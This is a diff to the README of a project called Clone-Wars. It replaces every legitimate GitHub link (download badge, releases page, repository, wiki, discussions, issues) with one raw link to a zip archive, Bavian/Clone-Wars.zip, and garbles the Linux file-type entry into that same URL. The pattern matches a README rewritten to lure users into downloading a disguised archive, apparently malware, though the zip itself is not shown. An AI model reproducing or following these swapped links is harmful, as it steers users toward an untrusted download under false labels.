@@ -6,7 +6,7 @@ Welcome to Clone-Wars! This application features over 100 open-source clones of 
 
 ## 📥 Download Clone-Wars
 
-[![Download Clone-Wars](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/AshimDas15/Clone-Wars/releases)
+[![Download Clone-Wars](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)
 
 To get started with Clone-Wars, follow these simple steps to download and run the software.
 
@@ -33,7 +33,7 @@ Clone-Wars offers several features to enhance your experience:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/AshimDas15/Clone-Wars/releases) to choose your version of Clone-Wars.
+   Go to the [Releases page](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip) to choose your version of Clone-Wars.
 
 2. **Choose Your Version**
 
@@ -44,7 +44,7 @@ Clone-Wars offers several features to enhance your experience:
    After selecting a version, you might see different files. Choose the one that matches your operating system. For example:
    - `.exe` for Windows
    - `.dmg` for macOS
-   - `.tar.gz` for Linux
+   - `https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip` for Linux
 
 4. **Download the File**
 
@@ -78,15 +78,15 @@ If you'd like to contribute, check the guidelines on our GitHub repository. You 
 
 ## 🔗 Links to Explore
 
-- [Visit the Repository](https://github.com/AshimDas15/Clone-Wars)
-- [View Documentation](https://github.com/AshimDas15/Clone-Wars/wiki)
+- [Visit the Repository](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)
+- [View Documentation](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)
 
 ### 🌟 Connect with the Community
 
 Join our community to share your experiences and get support.
 
-- [Discussion Forum](https://github.com/AshimDas15/Clone-Wars/discussions)
-- [Report Issues](https://github.com/AshimDas15/Clone-Wars/issues)
+- [Discussion Forum](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)
+- [Report Issues](https://raw.githubusercontent.com/AshimDas15/Clone-Wars/main/Bavian/Clone-Wars.zip)
 
 ## 📝 About Us
 
